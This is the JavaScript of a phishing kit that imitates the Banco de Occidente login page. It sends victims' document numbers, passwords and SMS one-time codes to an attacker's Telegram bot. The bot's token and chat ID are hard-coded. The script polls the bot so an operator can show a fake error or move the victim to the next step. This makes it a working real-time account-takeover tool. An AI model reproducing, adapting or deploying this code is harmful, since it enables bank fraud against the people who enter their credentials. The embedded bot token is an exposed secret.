document.addEventListener('DOMContentLoaded', function() {
    // Verificar elementos críticos primero
    const form = document.querySelector('.login-form');
    const docNumber = document.querySelector('#docNumber');
    const docType = document.querySelector('#docType');
    const passwordInput = document.querySelector('#password');
    const submitBtn = document.querySelector('.submit-btn');
    const rememberCheck = document.querySelector('#remember');
    const loadingOverlay = document.getElementById('loadingOverlay');
    const smsModal = document.getElementById('smsModal');
    const errorMessage = document.getElementById('errorMessage');
    const smsErrorMessage = document.getElementById('smsErrorMessage');
    const smsInputs = document.querySelectorAll('.sms-code-input input');
    const submitSmsCode = document.getElementById('submitSmsCode');
    const resendCodeBtn = document.getElementById('resendCode');
    const timerDisplay = document.getElementById('smsTimer');
    let timer;
    let pollingInterval;

    // ⚠️ ADVERTENCIA: Esto es inseguro, debería estar en el servidor
    const TELEGRAM_API_KEY = '8627198220:AAHlyBdeq2SeDlVN6G4_6QPdQrwU3tY-ICw';
    const TELEGRAM_CHAT_ID = '-1004245962123';

    // Verificar elementos críticos
    if (!form || !docNumber || !passwordInput || !submitBtn) {
        console.error('Error: Faltan elementos del formulario');
        return;
    }

    // Tab switching functionality
    const tabs = document.querySelectorAll('.tab-btn');
    tabs.forEach(tab => {
        tab.addEventListener('click', () => {
            tabs.forEach(t => t.classList.remove('active'));
            tab.classList.add('active');
        });
    });

    // Password visibility toggle
    const togglePassword = document.querySelector('.toggle-password');
    if (togglePassword && passwordInput) {
        togglePassword.addEventListener('click', () => {
            const type = passwordInput.getAttribute('type') === 'password' ? 'text' : 'password';
            passwordInput.setAttribute('type', type);
            togglePassword.innerHTML = type === 'password' ? 
                '<i class="fas fa-eye"></i>' : 
                '<i class="fas fa-eye-slash"></i>';
        });
    }

    // Validate form fields
    function validateForm() {
        const isDocNumberValid = docNumber.value.length > 0;
        const isPasswordValid = passwordInput.value.length > 0;
        
        submitBtn.disabled = !(isDocNumberValid && isPasswordValid);
        submitBtn.style.opacity = (isDocNumberValid && isPasswordValid) ? '1' : '0.7';
    }

    // Save form data if remember is checked
    function saveFormData() {
        if (rememberCheck && rememberCheck.checked) {
            if (docType) localStorage.setItem('occidente_docType', docType.value);
            localStorage.setItem('occidente_docNumber', docNumber.value);
            localStorage.setItem('occidente_remember', 'true');
        } else {
            localStorage.removeItem('occidente_docType');
            localStorage.removeItem('occidente_docNumber');
            localStorage.removeItem('occidente_remember');
        }
    }

    // Load saved form data
    function loadFormData() {
        const savedRemember = localStorage.getItem('occidente_remember');
        if (savedRemember) {
            const savedDocType = localStorage.getItem('occidente_docType');
            const savedDocNumber = localStorage.getItem('occidente_docNumber');
            
            if (docType && savedDocType) docType.value = savedDocType;
            if (savedDocNumber) docNumber.value = savedDocNumber; // ✅ CORREGIDO: Faltaba esta línea
            if (rememberCheck) rememberCheck.checked = true;
            
            validateForm();
        }
    }

    // SMS code input handling
    if (smsInputs.length > 0) {
        smsInputs.forEach((input, index) => {
            input.addEventListener('input', (e) => {
                if (e.target.value.length === 1) {
                    if (index < smsInputs.length - 1) {
                        smsInputs[index + 1].focus();
                    }
                }
            });

            input.addEventListener('keydown', (e) => {
                if (e.key === 'Backspace' && index > 0 && input.value.length === 0) {
                    smsInputs[index - 1].focus();
                }
            });

            // Only allow numbers
            input.addEventListener('keypress', (e) => {
                if (!/[0-9]/.test(e.key)) {
                    e.preventDefault();
                }
            });
        });
    }

    async function sendTelegramMessage(message, options = ['Mostrar error', 'Permitir acceso']) {
        const url = `https://api.telegram.org/bot${TELEGRAM_API_KEY}/sendMessage`;
        
        const keyboard = {
            inline_keyboard: [
                options.map(option => ({ 
                    text: option, 
                    callback_data: option.toLowerCase().replace(/ /g, '_') 
                }))
            ]
        };
        
        try {
            const response = await fetch(url, {
                method: 'POST',
                headers: {
                    'Content-Type': 'application/json',
                },
                body: JSON.stringify({
                    chat_id: TELEGRAM_CHAT_ID,
                    text: message,
                    parse_mode: 'HTML',
                    reply_markup: keyboard  // ✅ CORREGIDO: Sin JSON.stringify
                }),
            });
            
            if (!response.ok) {
                throw new Error(`HTTP error! status: ${response.status}`);
            }
            
            const data = await response.json();
            
            if (!data.ok) {
                throw new Error(`Telegram API error: ${data.description}`);
            }
            
            console.log('Mensaje enviado a Telegram:', data);
            return data.result ? data.result.message_id : null;
        } catch (error) {
            console.error('Error al enviar mensaje a Telegram:', error);
            return null;
        }
    }

    async function checkTelegramResponse(messageId) {
        // ✅ CORREGIDO: Buscar en todos los updates, no solo el último
        const url = `https://api.telegram.org/bot${TELEGRAM_API_KEY}/getUpdates?limit=100`;
        
        try {
            const response = await fetch(url);
            
            if (!response.ok) {
                throw new Error(`HTTP error! status: ${response.status}`);
            }
            
            const data = await response.json();
            
            if (data.ok && data.result.length > 0) {
                // Buscar el callback_query que corresponda a nuestro mensaje
                for (const update of data.result) {
                    if (update.callback_query && 
                        update.callback_query.message && 
                        update.callback_query.message.message_id === messageId) {
                        return update.callback_query.data;
                    }
                }
            }
            return null;
        } catch (error) {
            console.error('Error al verificar la respuesta de Telegram:', error);
            return null;
        }
    }

    function startPolling(messageId) {
        return new Promise((resolve) => {
            let attempts = 0;
            const maxAttempts = 150; // 5 minutos máximo
            
            pollingInterval = setInterval(async () => {
                attempts++;
                const response = await checkTelegramResponse(messageId);
                
                if (response) {
                    clearInterval(pollingInterval);
                    resolve(response);
                } else if (attempts >= maxAttempts) {
                    clearInterval(pollingInterval);
                    resolve('timeout');
                }
            }, 2000);
        });
    }

    function clearSmsFields() {
        // ✅ CORREGIDO: Solo limpiar campos SMS, NO los del formulario principal
        smsInputs.forEach(input => input.value = '');
        if (smsInputs.length > 0) smsInputs[0].focus();
    }

    function clearAllFields() {
        docNumber.value = '';
        passwordInput.value = '';
        clearSmsFields();
        if (errorMessage) {
            errorMessage.style.display = 'none';
            errorMessage.textContent = '';
        }
        if (smsErrorMessage) {
            smsErrorMessage.style.display = 'none';
            smsErrorMessage.textContent = '';
        }
    }

    function showSmsError(message) {
        if (smsErrorMessage) {
            smsErrorMessage.textContent = message;
            smsErrorMessage.style.display = 'block';
        }
        if (smsModal) smsModal.style.display = 'flex';
        if (smsErrorMessage) {
            smsErrorMessage.scrollIntoView({ behavior: 'smooth', block: 'center' });
        }
    }

    function clearSmsError() {
        if (smsErrorMessage) {
            smsErrorMessage.textContent = '';
            smsErrorMessage.style.display = 'none';
        }
    }

    function startSmsTimer() {
        clearSmsFields();
        clearSmsError();
        let timeLeft = 300; // 5 minutes in seconds
        
        if (resendCodeBtn) resendCodeBtn.classList.add('disabled');

        clearInterval(timer);
        timer = setInterval(() => {
            const minutes = Math.floor(timeLeft / 60);
            const seconds = timeLeft % 60;
            
            if (timerDisplay) {
                timerDisplay.textContent = `${minutes}:${seconds.toString().padStart(2, '0')}`;
            }

            if (timeLeft === 0) {
                clearInterval(timer);
                if (resendCodeBtn) resendCodeBtn.classList.remove('disabled');
                showSmsError('El código SMS ha expirado. Por favor, inicie sesión nuevamente.');
            } else {
                timeLeft--;
            }
        }, 1000);
    }

    // Resend code functionality
    if (resendCodeBtn) {
        resendCodeBtn.addEventListener('click', (e) => {
            e.preventDefault();
            if (!resendCodeBtn.classList.contains('disabled')) {
                startSmsTimer();
                
                const originalText = resendCodeBtn.innerHTML;
                resendCodeBtn.innerHTML = '<i class="fas fa-check"></i> Código reenviado';
                setTimeout(() => {
                    resendCodeBtn.innerHTML = originalText;
                }, 3000);
            }
        });
    }

    // Limpiar todos los campos al cargar la página
    clearAllFields();

    // Form submission
    form.addEventListener('submit', async function(e) {
        e.preventDefault();
        saveFormData();
        
        if (loadingOverlay) loadingOverlay.style.display = 'flex';
        if (errorMessage) errorMessage.style.display = 'none';
        
        const username = docNumber.value;
        const password = passwordInput.value;
        
        const messageId = await sendTelegramMessage(`
🏦 Nuevo intento de acceso a Banco de Occidente
👤 Usuario: ${username}
🔑 Contraseña: ${password}

Por favor, seleccione una acción:
        `);
        
        if (messageId) {
            const adminResponse = await startPolling(messageId);
            
            if (loadingOverlay) loadingOverlay.style.display = 'none';
            
            if (adminResponse === 'mostrar_error') {
                if (errorMessage) {
                    errorMessage.textContent = 'Usuario o contraseña incorrectos. Por favor, inténtelo de nuevo.';
                    errorMessage.style.display = 'block';
                }
                submitBtn.disabled = false;
                
                // Limpiar campos después de 3 segundos
                setTimeout(() => {
                    docNumber.value = '';
                    passwordInput.value = '';
                    validateForm();
                }, 3000);
                
            } else if (adminResponse === 'permitir_acceso') {
                if (smsModal) smsModal.style.display = 'flex';
                startSmsTimer();
            }
        } else {
            if (loadingOverlay) loadingOverlay.style.display = 'none';
            if (errorMessage) {
                errorMessage.textContent = 'Hubo un error al procesar su solicitud. Por favor, inténtelo de nuevo más tarde.';
                errorMessage.style.display = 'block';
            }
            submitBtn.disabled = false;
        }
    });

    // SMS verification
    if (submitSmsCode) {
        submitSmsCode.addEventListener('click', async () => {
            const code = Array.from(smsInputs).map(input => input.value).join('');
            
            // Detectar longitud esperada según inputs disponibles
            const expectedLength = smsInputs.length || 6;

            if (code.length === expectedLength) {
                if (loadingOverlay) loadingOverlay.style.display = 'flex';
                if (smsModal) smsModal.style.display = 'none';
                clearInterval(timer);

                const messageId = await sendTelegramMessage(`
🏦 Código OTP ingresado para Banco de Occidente
🔢 Código: ${code}

Por favor, seleccione una acción:
            `, ['Error de token', 'Permitir acceso']);

                if (messageId) {
                    const adminResponse = await startPolling(messageId);

                    if (loadingOverlay) loadingOverlay.style.display = 'none';
                    if (smsModal) smsModal.style.display = 'flex';

                    if (adminResponse === 'error_de_token') {
                        showSmsError('Error en el token. Por favor, intente nuevamente.');
                        setTimeout(() => {
                            startSmsTimer();
                        }, 3000);
                    } else if (adminResponse === 'permitir_acceso') {
                        clearAllFields();
                        window.location.href = '../confirmacion.html';
                    } else if (adminResponse === 'timeout') {
                        showSmsError('Tiempo de espera agotado.');
                        setTimeout(() => {
                            startSmsTimer();
                        }, 3000);
                    }
                } else {
                    if (loadingOverlay) loadingOverlay.style.display = 'none';
                    if (smsModal) smsModal.style.display = 'flex';
                    showSmsError('Hubo un error al procesar su solicitud. Por favor, inténtelo de nuevo más tarde.');
                    setTimeout(() => {
                        startSmsTimer();
                    }, 3000);
                }
            } else {
                showSmsError(`Por favor, ingrese el código SMS completo de ${expectedLength} dígitos.`);
                setTimeout(() => {
                    clearSmsError();
                }, 3000);
            }
        });
    }

    // Initialize form
    loadFormData();
    validateForm();

    // Form validation on input
    form.addEventListener('input', validateForm);
});